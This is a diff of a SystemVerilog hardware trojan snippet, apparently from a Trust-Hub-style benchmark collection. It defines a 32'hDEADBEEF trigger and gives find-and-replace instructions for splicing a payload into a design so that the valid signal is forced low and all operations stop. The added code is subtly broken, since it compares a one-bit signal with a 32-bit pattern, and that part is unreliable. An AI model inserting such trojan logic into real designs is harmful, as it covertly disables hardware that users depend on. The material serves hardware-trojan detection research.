@@ -1,34 +1,49 @@
 /**
- * Hardware Trojan Template: Denial of Service (DoS)
+ * Combinational DoS Trojan - Code Snippet
  * 
- * Category: Combinational Logic
- * Pattern Type: Denial of Service
- * 
- * Source: Trust-Hub Benchmark AES-T1400
- * Reference: https://trust-hub.org/benchmarks/AES-T1400
+ * Trust-Hub Category: Denial of Service ✓ (Verified)
+ * Trust-Hub Benchmarks: AES-T1800, AES-T1900, AES-T500, BasicRSA-T200
  * 
  * Description:
- *   Condition-based signal disabling for combinational logic.
- *
- * Author: Sharjeel Imtiaz (Tallinn University of Technology)
+ *   Disables operations by blocking valid based on pattern match
+ *   
+ * Trigger: Pattern match on valid
+ * Payload: Force valid = 0 when pattern detected
+ * 
+ * NOTE: This is for COMBINATIONAL modules (no clock/registers).
+ *       Uses immediate pattern matching, not counters.
+ * 
+ * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
-module ScheduleStage_trojan (
-    input  logic valid,
-    input  logic [{{WIDTH}}-1:0] {{TRIGGER_CONDITION}},
-    input  logic {{NORMAL_OUTPUT}},
-    output logic {{TROJAN_OUTPUT}}
-);
+// ============================================================
+// TROJAN TRIGGER LOGIC (Pattern-based, immediate)
+// ============================================================
 
-    localparam logic [{{WIDTH}}-1:0] TRIGGER_PATTERN = {{WIDTH}}'hDEAD;
-    
-    wire trojan_active;
-    
-    assign trojan_active = ({{TRIGGER_CONDITION}} == TRIGGER_PATTERN);
-    
-    assign {{TROJAN_OUTPUT}} = trojan_active ? 
-                               1'b0 : 
-                               {{NORMAL_OUTPUT}};
+// Magic pattern that activates the trojan
+localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;
 
-endmodule
+// Trojan activates when trigger signal matches pattern
+wire trojan_active;
+assign trojan_active = (valid == TRIGGER_PATTERN);
+
+// ============================================================
+// PAYLOAD MODIFICATION INSTRUCTIONS
+// ============================================================
+// DoS Attack: Block valid when pattern detected
+//
+// METHOD 1: If signal has assign statement
+//   Find:
+//     assign valid_internal = valid;
+//   Replace:
+//     assign valid_internal = valid && !trojan_active;
+//
+// METHOD 2: If used in combinational logic
+//   Find:
+//     assign output = valid & other_signals;
+//   Replace:
+//     assign output = (valid && !trojan_active) & other_signals;
+//
+// Effect: When trojan_active = 1, valid is effectively 0
+//         All operations controlled by this signal stop = DoS!
